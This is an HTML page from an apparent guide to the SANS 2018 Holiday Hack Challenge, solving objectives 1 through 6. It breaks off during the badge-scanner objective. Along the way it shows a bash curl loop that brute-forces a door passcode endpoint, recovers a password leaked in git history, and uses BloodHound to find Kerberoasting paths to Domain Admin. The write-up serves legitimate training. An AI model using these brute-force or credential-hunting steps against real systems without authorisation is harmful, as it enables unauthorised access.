



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
        <meta name="author" content="B">
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.2.0">
    
    
      
        <title>Main Objectives</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/application.572ca0f0.css">
      
      
    
    
      <script src="../assets/javascripts/modernizr.8c900955.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
    
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#1-orientation-challenge" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href=".." title="SANS 2018 Holiday Hack Challenge Guide" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              <span class="md-header-nav__topic">
                SANS 2018 Holiday Hack Challenge Guide
              </span>
              <span class="md-header-nav__topic">
                Main Objectives
              </span>
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href=".." title="SANS 2018 Holiday Hack Challenge Guide" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    SANS 2018 Holiday Hack Challenge Guide
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href=".." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Main Objectives
      </label>
    
    <a href="./" title="Main Objectives" class="md-nav__link md-nav__link--active">
      Main Objectives
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#1-orientation-challenge" title="1) Orientation Challenge" class="md-nav__link">
    1) Orientation Challenge
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-directory-browsing" title="2) Directory Browsing" class="md-nav__link">
    2) Directory Browsing
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-de-bruijn-sequences" title="3) de Bruijn Sequences" class="md-nav__link">
    3) de Bruijn Sequences
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-data-repo-analysis" title="4) Data Repo Analysis" class="md-nav__link">
    4) Data Repo Analysis
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-ad-privilege-discovery" title="5) AD Privilege Discovery" class="md-nav__link">
    5) AD Privilege Discovery
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-badge-manipulation" title="6) Badge Manipulation" class="md-nav__link">
    6) Badge Manipulation
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#7-hr-incident-response" title="7) HR Incident Response" class="md-nav__link">
    7) HR Incident Response
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8-network-traffic-forensics" title="8) Network Traffic Forensics" class="md-nav__link">
    8) Network Traffic Forensics
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#9-ransomware-recovery" title="9) Ransomware Recovery" class="md-nav__link">
    9) Ransomware Recovery
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#9a-catch-the-malware" title="9a) Catch the Malware" class="md-nav__link">
    9a) Catch the Malware
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9b-identify-the-domain" title="9b) Identify the Domain" class="md-nav__link">
    9b) Identify the Domain
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9c-stop-the-malware" title="9c) Stop the Malware" class="md-nav__link">
    9c) Stop the Malware
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9d-recover-alabasters-password" title="9d) Recover Alabaster's Password" class="md-nav__link">
    9d) Recover Alabaster's Password
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#10-who-is-behind-it-all" title="10) Who Is Behind It All?" class="md-nav__link">
    10) Who Is Behind It All?
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../terminals/" title="Terminal Exercises" class="md-nav__link">
      Terminal Exercises
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../appendices/" title="Appendices" class="md-nav__link">
      Appendices
    </a>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#1-orientation-challenge" title="1) Orientation Challenge" class="md-nav__link">
    1) Orientation Challenge
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-directory-browsing" title="2) Directory Browsing" class="md-nav__link">
    2) Directory Browsing
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-de-bruijn-sequences" title="3) de Bruijn Sequences" class="md-nav__link">
    3) de Bruijn Sequences
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-data-repo-analysis" title="4) Data Repo Analysis" class="md-nav__link">
    4) Data Repo Analysis
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-ad-privilege-discovery" title="5) AD Privilege Discovery" class="md-nav__link">
    5) AD Privilege Discovery
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-badge-manipulation" title="6) Badge Manipulation" class="md-nav__link">
    6) Badge Manipulation
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#7-hr-incident-response" title="7) HR Incident Response" class="md-nav__link">
    7) HR Incident Response
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8-network-traffic-forensics" title="8) Network Traffic Forensics" class="md-nav__link">
    8) Network Traffic Forensics
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#9-ransomware-recovery" title="9) Ransomware Recovery" class="md-nav__link">
    9) Ransomware Recovery
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#9a-catch-the-malware" title="9a) Catch the Malware" class="md-nav__link">
    9a) Catch the Malware
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9b-identify-the-domain" title="9b) Identify the Domain" class="md-nav__link">
    9b) Identify the Domain
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9c-stop-the-malware" title="9c) Stop the Malware" class="md-nav__link">
    9c) Stop the Malware
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9d-recover-alabasters-password" title="9d) Recover Alabaster's Password" class="md-nav__link">
    9d) Recover Alabaster's Password
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#10-who-is-behind-it-all" title="10) Who Is Behind It All?" class="md-nav__link">
    10) Who Is Behind It All?
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>Main Objectives</h1>
                
                <h3 id="1-orientation-challenge">1) Orientation Challenge<a class="headerlink" href="#1-orientation-challenge" title="Permanent link">&para;</a></h3>
<blockquote>
<p>What phrase is revealed when you answer all of the questions at the KringleCon Holiday Hack History kiosk inside the castle? <em>For hints on achieving this objective, please visit Bushy Evergreen and help him with the Essential Editor Skills Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p><img alt="Challenge Location" src="../challenges/1-location.png" /></p>
<p>This challenge stretches our open-source intelligence (OSINT) gathering muscles by requiring us to search through previous challenges for the answers to the quiz questions. Luckily, we can find every link to the previous challenges in one page: <a href="https://holidayhackchallenge.com/past-challenges/">https://holidayhackchallenge.com/past-challenges/</a></p>
<p>We can access the quiz through the kiosk located on the first floor, but another option to is to navigate directly to the challenge's link: <a href="https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html">https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html</a></p>
<p><img alt="Quiz Page" src="../challenges/1-quiz.png" /></p>
<p>Answers:</p>
<table>
<thead>
<tr>
<th>Question</th>
<th>Answer</th>
</tr>
</thead>
<tbody>
<tr>
<td>In 2015, the Dosis siblings asked for help understanding what piece of their "Gnome in Your Home" toy?</td>
<td>Firmware</td>
</tr>
<tr>
<td>In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?</td>
<td>ATNAS</td>
</tr>
<tr>
<td>In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?</td>
<td>Business card</td>
</tr>
<tr>
<td>In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?</td>
<td>Cranberry Pi</td>
</tr>
<tr>
<td>In 2017, the North Pole was being bombarded by giant objects. What were they?</td>
<td>Snowballs</td>
</tr>
<tr>
<td>In 2017, Sam the snowman needed help reassembling pages torn from what?</td>
<td>The Great Book</td>
</tr>
</tbody>
</table>
<p>Upon correctly answering each question, we're greeted with the secret phrase: <strong><em>Happy Trails</em></strong></p>
<p><img alt="Answer - Happy Trails" src="../challenges/1-answer.png" /></p>
<h3 id="2-directory-browsing">2) Directory Browsing<a class="headerlink" href="#2-directory-browsing" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? <a href="https://cfp.kringlecastle.com/">Please analyze the CFP site to find out</a>. <em>For hints on achieving this objective, please visit Minty Candycane and help her with the The Name Game Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p>Upon navigating to <a href="https://cfp.kringlecastle.com/">https://cfp.kringlecastle.com/</a>, we begin by seeing our options in mapping out the website. However, the various links within the homepage lead only to <a href="https://cfp.kringlecastle.com/cfp/cfp.html">https://cfp.kringlecastle.com/cfp/cfp.html</a>, making that our only other option, right now.</p>
<p><img alt="CFP Index Page" src="../challenges/2-index.png" /></p>
<p>After running out of options for publically navigable pages, we start looking into ways to access more non-public ones. Our first attempt was to manually request <a href="https://cfp.kringlecastle.com/cfp/">https://cfp.kringlecastle.com/cfp/</a>, by removing the 'cfp.html' from the URL. This proved very fruitful as we discover that the web server has left 'directory indexing' enabled, showing us a list of files within the '/cfp/' directory. One of the two files seems to be a list of rejected talks and should contain the information we're looking for.</p>
<p><img alt="CFP Directory Indexing" src="../challenges/2-indexing.png" /></p>
<p>There are two options to obtain this information: in the browser, or in the command line.</p>
<p>Since the file is small, only 30KBs , and our search is relatively simple, we can make use of the browser's find function to search for the target information.</p>
<p><img alt="CFP Browser Searching" src="../challenges/2-rejectedcsv.png" /></p>
<p>However, if the file were to be much larger in size or if we needed to find more nuanced data, we could instead make use of the terminal to find our target information. The example here uses the 'curl' program to download the 'rejected-talks.csv' file and pipes it into the 'grep' program, which allows us to search the data using regular expressions. In this case, the regular expression is only a simple string.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ curl -s &quot;https://cfp.kringlecastle.com/cfp/rejected-talks.csv&quot; | grep &quot;Data Loss for Rainbow Teams: A Path in the Darkness&quot;
qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11
</code></pre>

<p>Through either of these searches, we discover that the author of 'Data Loss for Rainbow Teams: A Path in the Darkness', and the answer to this challenge, is <strong><em>John McClane</em></strong>.</p>
<h3 id="3-de-bruijn-sequences">3) de Bruijn Sequences<a class="headerlink" href="#3-de-bruijn-sequences" title="Permanent link">&para;</a></h3>
<blockquote>
<p>When you break into the speaker unpreparedness room, what does Morcel Nougat say? <em>For hints on achieving this objective, please visit Tangle Coalbox and help him with Lethal ForensicELFication Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p>We can find this challenge on in the right hallway of the second floor.</p>
<p><img alt="Location" src="../challenges/3-location.png" /></p>
<p>Clicking on the door passcode sprite brings us to the next challenge. We are given four symbols to chose from in order to create a four character passcode. Alternatively, you can use the following link to work on this challenge: <a href="https://doorpasscoden.kringlecastle.com/">https://doorpasscoden.kringlecastle.com/</a></p>
<p><img alt="Door Passcode - Incorrect Guess" src="../challenges/3-wrong.png" /></p>
<p>One thing that is interesting about this lock's behavior is, whenever you input another character while the passcode is four characters long, the new character is simply appended to the end of the passcode while removing the first character. This cyclic characteristic makes it possible to greatly simplify the time it would take to manually brute force the correct password by using a de Bruijn sequence.</p>
<p>A de Bruijn sequence is the shortest sequence where every combination of a given character set and word length will exist within that sequence. For example, given a character set of $[a, b, c]$ and a word length of two, you can find every possible combination of those characters within the following sequence: ${a a b a c b b c c}$</p>
<p>Since this passcode application simply looks at the previous four characters entered, we can manually brute force the door's code by inputting a de Bruijn sequence, one by one. By assigning each character to a number, we generate a sequence with a character set of four and a word length of four, using this website: http://www.hakank.org/comb/debruijn.cgi?k=4&amp;n=4&amp;submit=Ok</p>
<p>Where [0 = ▲, 1 = ◼, 2 = ◯, 3 = ★]</p>
<p>0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3</p>
<p>Using this sequence, we will brute force the door's combination within 256 button presses. After working through 22 characters of the sequence, we reach the correct answer, ▲◼◯▲, located within the sequence here:
0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 <strong>0 1 2 0</strong> 0 1 3 0 0 2 1</p>
<p>After inputting the correct passcode and breaking into the speaker unpreparedness room, Morcel Nougat gives us the answer to this challenge: <strong><em>Welcome unprepared speaker!</em></strong> </p>
<p><img alt="Door Passcode - Correct Guess" src="../challenges/3-correct.png" /></p>
<p><img alt="Welcome unprepared speaker!" src="../challenges/3-morcel.png" /></p>
<p><img alt="Website - Welcome unprepared speaker!" src="../challenges/3-sitevictory.png" /></p>
<p><strong>Alternative Solutions:</strong>
<em>Downloading the victory message directly:</em>
Looking through the source code for https://doorpasscoden.kringlecastle.com reveals an interesting line of HTML near the bottom of the source at line 123. This appears to be the victory banner used in the event of a correct passcode. By navigating to the image directly, we can simply see the victory message without dealing with bruteforcing the passcode.</p>
<pre><code class="html">&lt;img id=&quot;banner&quot; src=&quot;db-victory-banner.png&quot; style=&quot;position:absolute; left:50%; top:50%; transform: translate(-50%, -50%); max-width:60%; width: 60%; visibility: hidden;&quot; onMouseDown='this.style.visibility=&quot;hidden&quot;'&gt;
</code></pre>

<p><img alt="Website - Victory Banner" src="../challenges/3-dbvictorybanner.png" /></p>
<p>We can also discover this image via the 'Sources' tab of Google Chrome's DevTools.</p>
<p><img alt="Website - Victory Banner Sources" src="../challenges/3-chromesources.png" /></p>
<p><em>Brute-forcing the passcode:</em>
By examining the passcode application through the Chrome DevTools' Network tab, we can learn how it performs the password check and verifies validity.</p>
<p><img alt="Website - Requests" src="../challenges/3-requests.png" /></p>
<p>Here we see that the application checks the passcode's correctness by sending a GET request to https://doorpasscoden.kringlecastle.com/checkpass.php with two GET parameters:</p>
<p><code>'i' - the passcode to check, encoded using the numbers 0 to 3.</code></p>
<p><code>resourceId - set to undefined</code></p>
<p>If the passcode submitted is incorrect, then the webpage responds with:</p>
<p><code>{"success":false,"message":"Incorrect guess."}</code></p>
<p>If the passcode submitted is correct <em>(0120)</em> then the page responds with:</p>
<p><code>{"success":true,"resourceId":"undefined","hash":"0273f6448d56b3aba69af76f99bdc741
268244b7a187c18f855c6302ec93b703","message":"Correct guess!"}</code></p>
<p>Since the total number of passcode combinations is only 256, or <code>4^4</code>, this is well within the possibility for a computer to brute force.
Using the following command, we can generate a wordlist to conduct the brute-force with. This first generates a sequence of numbers from 0000 to 3333, using leading zeroes for numbers less than four characters in length. Then, using grep's extended regular expression function, it filters all numbers who have a character other than 0, 1, 2, or 3, leaving us with 256 valid passcodes to brute-force with.</p>
<p><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ seq -w 0 3333 | grep -E "[0-3]{4}" &gt; doorpasses.txt</code></p>
<p>Finally, using the following script, we can brute force the correct passcode to input:</p>
<pre><code class="bash">#!/bin/bash

# Iterates through each line of doorpasses.txt
for i in `cat doorpasses.txt`; do
    # Using grep's '-q' flag, we test if the response from the server includes 'Correct'
    # If so, then we know we've hit the correct passcode
    if curl -s &quot;https://doorpasscoden.kringlecastle.com/
    checkpass.php?i=$i&amp;resourceId=undefined&quot; | grep -q &quot;Correct&quot;; then
        echo &quot;The password is $i&quot;
        curl -s &quot;https://doorpasscoden.kringlecastle.com/checkpass.php?
        i=$i&amp;resourceId=undefined&quot;
        echo &quot;&quot;
        break;
    fi
done
</code></pre>

<p>Example run, completes in approximately five seconds:</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ time ./q3_doorpass.sh
The password is 0120
{&quot;success&quot;:true,&quot;resourceId&quot;:&quot;undefined&quot;,&quot;hash&quot;:&quot;0273f6448d56b3aba69
af76f99bdc741268244b7a187c18f855c6302ec93b703&quot;,&quot;message&quot;:&quot;Correct guess!&quot;}

real    0m5.048s
user    0m0.406s
sys     0m1.016s
</code></pre>

<h3 id="4-data-repo-analysis">4) Data Repo Analysis<a class="headerlink" href="#4-data-repo-analysis" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Retrieve the encrypted ZIP file from the <a href="https://git.kringlecastle.com/Upatree/santas_castle_automation">North Pole Git repository</a>. What is the password to open this file? For hints on achieving this objective, please visit Wunorse Openslae and help him with Stall Mucking Report Cranberry Pi terminal challenge.</p>
</blockquote>
<p>We're first directed to a GitLab repository located at:</p>
<p>https://git.kringlecastle.com/Upatree/santas_castle_automation
This appears to be a project aimed at automatically controlling a fleet of drones in order to deliver presents for Christmas.</p>
<p><img alt="Santas Castle Automation" src="../challenges/4-repopage.png" /></p>
<p>Our next step is to clone this repository to our local machine for further analysis.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git$ git clone https://git.kringlecastle.com/Upatree/santas_castle_automation.git
Cloning into 'santas_castle_automation'...
remote: Enumerating objects: 949, done.
remote: Counting objects: 100% (949/949), done.
remote: Compressing objects: 100% (545/545), done.
remote: Total 949 (delta 258), reused 879 (delta 205)
Receiving objects: 100% (949/949), 4.27 MiB | 11.31 MiB/s, done.
Resolving deltas: 100% (258/258), done.
Checking out files: 100% (2966/2966), done.
</code></pre>

<p>After searching through the cloned repository, we find our target. An encrypted zip file within the schematics directory: <code>ventilation_diagram.zip</code></p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git/santas_castle_
automation/schematics$ ls -lah
total 880K
drwxrwxrwx 1 bernard bernard  512 Jan  8 22:24 .
drwxrwxrwx 1 bernard bernard  512 Jan  8 22:24 ..
-rwxrwxrwx 1 bernard bernard 155K Jan  8 22:24 EE3.jpg
drwxrwxrwx 1 bernard bernard  512 Jan  8 22:24 files
drwxrwxrwx 1 bernard bernard  512 Jan  8 22:24 puppet
drwxrwxrwx 1 bernard bernard  512 Jan  8 22:24 shell
-rwxrwxrwx 1 bernard bernard 724K Jan  8 22:24 ventilation_diagram.zip
bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git/santas_castle_
automation/schematics$ unzip vent*
Archive:  ventilation_diagram.zip
   creating: ventilation_diagram/
[ventilation_diagram.zip] ventilation_diagram/ventilation_diagram_2F.jpg password:
password incorrect--reenter:
   skipping: ventilation_diagram/ventilation_diagram_2F.jpg  incorrect password
   skipping: ventilation_diagram/ventilation_diagram_1F.jpg  incorrect password
</code></pre>

<p>Based on Wunorse's clue from the terminal challenge, we will check the repository's changelog to see if they've mistakenly uploaded a password in a previous commit. While searching the log, we find an interesting commit with the ID: <code>714ba109e573f37a6538beeeb7d11c9391e92a72</code></p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git/santas_castle
_automation$ git log --summary
[...snip...]
commit 714ba109e573f37a6538beeeb7d11c9391e92a72
Author: Shinny Upatree &lt;shinny.upatree@kringlecastle.com&gt;
Date:   Tue Dec 11 07:23:36 2018 +0000

    removing accidental commit

 delete mode 100644 schematics/files/dot/PW/for_elf_eyes_only.md

[...snip...]
</code></pre>

<p>Now we'll look into exactly what this commit removed from the repository. If this commit's purpose was to remove an accident password upload, then that password will show up as one of the differences.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git/santas_castle
_automation$ git show 714ba109e573f37a6538beeeb7d11c9391e92a72
commit 714ba109e573f37a6538beeeb7d11c9391e92a72
Author: Shinny Upatree &lt;shinny.upatree@kringlecastle.com&gt;
Date:   Tue Dec 11 07:23:36 2018 +0000

    removing accidental commit

diff --git a/schematics/files/dot/PW/for_elf_eyes_only.md b/schematics/files/dot/PW/for_elf_eyes_only.md
deleted file mode 100644
index b06a507..0000000
--- a/schematics/files/dot/PW/for_elf_eyes_only.md
+++ /dev/null
@@ -1,15 +0,0 @@
-Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference.
-
-Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did!
-
-
-Hopefully this is the last time we have to change our password again until next Christmas.
-
-
-
-
-Password = 'Yippee-ki-yay'
-
-
-Change ID = '9ed54617547cfca783e0f81f8dc5c927e3d1e3'
-

</code></pre>

<p>This method proved fruitful and we've successfully located the password for the encrypted zip folder: <strong><em>Yippee-ki-yay</em></strong>
Using this password, we now unzip the <code>ventilation_diagram.zip</code> file.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git/santas_castle
_automation/schematics$ unzip vent*.zip
Archive:  ventilation_diagram.zip
[ventilation_diagram.zip] ventilation_diagram/ventilation_diagram_2F.jpg password:
  inflating: ventilation_diagram/ventilation_diagram_2F.jpg
  inflating: ventilation_diagram/ventilation_diagram_1F.jpg
</code></pre>

<p>Within the encrypted zip file, we find two jpg images that appear to be maps for a ventilation system. These maps should come in handy for a future challenge.</p>
<p><img alt="Ventilation Diagram 1F" src="../challenges/ventilation_diagram_1F.jpg" /></p>
<p><img alt="Ventilation Diagram 2F" src="../challenges/ventilation_diagram_2F.jpg" /></p>
<h3 id="5-ad-privilege-discovery">5) AD Privilege Discovery<a class="headerlink" href="#5-ad-privilege-discovery" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Using the data set contained in this <a href="https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova">SANS Slingshot Linux image</a>, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. <em>For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p>This challenge will take place within the provided virtual machine file, <code>HHC2018-DomainHack_2018-12-19.ova</code>. Our first step is to add the image to our VirtualBox VM Manager. One thing to note is that we need to change the Guest OS Type to a 64-bit machine from 32-bit in order for it to boot properly.</p>
<p><img alt="Import OVA" src="../challenges/5-import.png" /></p>
<p><img alt="Importing" src="../challenges/5-importing.png" /></p>
<p><img alt="Ready to Run" src="../challenges/5-readytorun.png" /></p>
<p>Our next step is to launch the BloodHound application.</p>
<p><img alt="VM Desktop" src="../challenges/5-desktop.png" /></p>
<p>Now using the built-in query <em>Shortest Paths to Domain Admins from Kerberoastable Users</em>, we generate a map of all Kerberoastable users who have a path to domain admin.</p>
<p><img alt="Selecting Query" src="../challenges/5-bloodhound.png" /></p>
<p><img alt="Ran Query" src="../challenges/5-kerbtoda.png" /></p>
<p>Of each user mapped out in the BloodHound diagram, <strong>LDUBEJ00320@AD.KRINGLECASTLE.COM</strong> is the only user who can reach domain admin without going through RDP; a control path the instructions specified for us to avoid due to its dependance on local privilege escalation attacks.</p>
<p><img alt="LDUBEJ00320" src="../challenges/5-ldube.png" /></p>
<h3 id="6-badge-manipulation">6) Badge Manipulation<a class="headerlink" href="#6-badge-manipulation" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Bypass the authentication mechanism associated with the room near Pepper Minstix. <a href="https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg">A sample employee badge is available</a>. What is the access control number revealed by the door authentication panel? <em>For hints on achieving this objective, please visit Pepper Minstix and help her with the Yule Log Analysis Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p>We can find this challenge at the very end of the second floor's right hallway.</p>
<p><img alt="Location" src="../challenges/6-location.png" /></p>
<p>Our first step to to examine the example employee badge given for the challenge. Decoding the QR code in the sample badge, using the following website https://zxing.org/w/decode.jspx, gives the the following string: <code>oRfjg5uGHmbduj2m</code></p>
<p>Intial analysis of the string doesn't decode it to anything else, leaving us to believe that it simply may just be an employee ID.</p>
<p><img alt="Alabaster's Employee Badge" src="../challenges/6-alabaster_badge.jpg" /></p>
<p>Clicking on the Scan-O-Matic brings us to the scanning UI, with a webcam display located on the left-side screen.</p>
<p><img alt="Scan-O-Matic" src="../challenges/6-scanomatic.png" /></p>
<p>Attempting to use the fingerprint scanner gives us the following error message: <code>QR Code Not Found. Only QR Code and White Space may be visible!</code></p>
<p><img alt="Fingerprint" src="../challenges/6-finger.png" /></p>
<p><img alt="Error" src="../challenges/6-fingererror.png" /></p>
<p>We also find that we can upload images via the USB port on the bottom right. </p>
<p><img alt="PNG Upload" src="../challenges/6-usb.png" /></p>
<p>After uploading the Alabaster's badge, we receive the following error code: <code>PNG Files Only</code></p>
<p>We can convert the badge to a PNG image, but using it still gives us another error message: <code>Authorized User Account Has Been Disabled!</code></p>
<p>By examining the application using Chrome's DevTools, we discover several things.
-   The URL for the application is located at https://scanomatic.kringlecastle.com/index.html
-   The app sends a POST request to https://scanomatic.kringlecastle.com/upload with the image file base64-encoded in the <code>b64barcode</code> parameter or in raw form using the <code>barcode</code> parameter.
